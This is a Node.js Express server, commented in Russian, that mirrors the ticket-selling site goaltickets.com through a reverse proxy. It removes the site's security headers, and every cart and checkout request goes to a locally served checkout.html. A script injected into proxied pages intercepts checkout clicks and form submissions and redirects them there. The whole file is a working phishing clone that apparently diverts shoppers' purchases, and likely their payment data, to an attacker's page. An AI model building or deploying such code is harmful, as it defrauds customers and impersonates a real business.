const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: true,
  credentials: true
}));

// Кэширование статических файлов
app.use(express.static('index_files', {
  maxAge: '1d',
  etag: false
}));

// Логирование только важных запросов
app.use((req, res, next) => {
  if (!req.url.includes('/cdn/') && !req.url.includes('/api/')) {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  }
  next();
});

// Обработка статических файлов локально
app.get('/index_files/*', (req, res, next) => {
  // Если файл есть локально, отдаем его
  next();
});

// 🎯 ПЕРЕХВАТ CHECKOUT СТРАНИЦ
app.get('/checkout*', (req, res) => {
  console.log('🎯 Checkout intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

app.get('/cart', (req, res) => {
  console.log('🎯 Cart page intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Перехватываем все возможные варианты checkout
app.get('*checkout*', (req, res) => {
  console.log('🎯 Checkout variant intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Обработка POST запросов (возвращаем 200 для избежания ошибок)
app.post('/api/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Обработка POST запросов к корзине
app.post('/cart', (req, res) => {
  console.log('🛒 Cart POST intercepted:', req.url);
  res.status(200).json({ 
    success: true, 
    redirect: '/checkout',
    message: 'Redirecting to checkout...' 
  });
});

app.post('/cart/*', (req, res) => {
  // Если это запрос на добавление в корзину, логируем и перенаправляем
  if (req.url.includes('add') || req.url.includes('update')) {
    console.log('🛒 Cart action intercepted:', req.url);
    res.status(200).json({ 
      success: true, 
      redirect: '/checkout',
      message: 'Redirecting to checkout...' 
    });
  } else {
    res.status(200).json({ success: true });
  }
});

// Обработка POST запросов к checkout
app.post('/checkout*', (req, res) => {
  console.log('🎯 Checkout POST intercepted:', req.url);
  res.status(200).json({ 
    success: true, 
    redirect: '/checkout',
    message: 'Redirecting to checkout...' 
  });
});

app.post('/.well-known/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Настройка прокси только для HTML страниц
const proxyOptions = {
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  timeout: 10000, // 10 секунд таймаут
  proxyTimeout: 10000,
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    proxyReq.setHeader('Connection', 'keep-alive');
    proxyReq.setHeader('Cache-Control', 'no-cache');
  },
  onProxyRes: (proxyRes, req, res) => {
    // Удаляем проблемные заголовки
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['x-content-type-options'];
    delete proxyRes.headers['referrer-policy'];
    
    // Добавляем кэширование
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
    }
    
    // Добавляем CORS
    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
    
    // Инжектируем скрипт перехвата checkout
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        // Добавляем скрипт перехвата перед закрывающим тегом </body>
        const checkoutScript = `
          <script>
            // 🎯 CHECKOUT INTERCEPTOR
            (function() {
              console.log('🎯 Checkout Interceptor loaded');
              
              function interceptCheckoutClicks() {
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const text = target.textContent?.toLowerCase() || '';
                  const href = target.href || '';
                  const form = target.closest('form');
                  
                  if (text.includes('checkout') || text.includes('купить') || 
                      text.includes('оформить') || href.includes('checkout') ||
                      target.classList.contains('checkout') || target.id.includes('checkout') ||
                      (form && form.action && form.action.includes('cart'))) {
                    console.log('🎯 Checkout button clicked:', target);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    // Показываем уведомление
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Перенаправляем на checkout...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 500);
                    
                    return false;
                  }
                });
              }
              
              // Перехватываем формы
              function interceptForms() {
                document.addEventListener('submit', function(event) {
                  const form = event.target;
                  const action = form.action?.toLowerCase() || '';
                  
                  if (action.includes('cart') || action.includes('checkout')) {
                    console.log('🎯 Form submission intercepted:', form);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Обрабатываем заказ...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 1000);
                    
                    return false;
                  }
                });
              }
              
              if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                  interceptCheckoutClicks();
                  interceptForms();
                });
              } else {
                interceptCheckoutClicks();
                interceptForms();
              }
              
              // Дополнительная проверка
              setTimeout(() => {
                interceptCheckoutClicks();
                interceptForms();
              }, 2000);
            })();
          </script>
        `;
        
        // Вставляем скрипт перед </body>
        const modifiedBody = body.replace('</body>', checkoutScript + '</body>');
        
        if (!res.headersSent) {
          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
          res.end(modifiedBody);
        }
      });
      
      return;
    }
  },
  onError: (err, req, res) => {
    console.error('Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(500).send('Service temporarily unavailable');
    }
  }
};

// Применяем прокси только к корневой странице
app.get('/', createProxyMiddleware(proxyOptions));

// Для всех остальных GET запросов - прокси к оригинальному сайту
app.get('*', createProxyMiddleware({
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  timeout: 5000,
  onError: (err, req, res) => {
    if (!res.headersSent) {
      res.status(404).send('Not found');
    }
  }
}));

// Обработка ошибок
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Proxy server running on port ${PORT}`);
  console.log(`📡 Proxying requests to: https://goaltickets.com`);
  console.log(`🌐 Access your proxy at: http://localhost:${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});
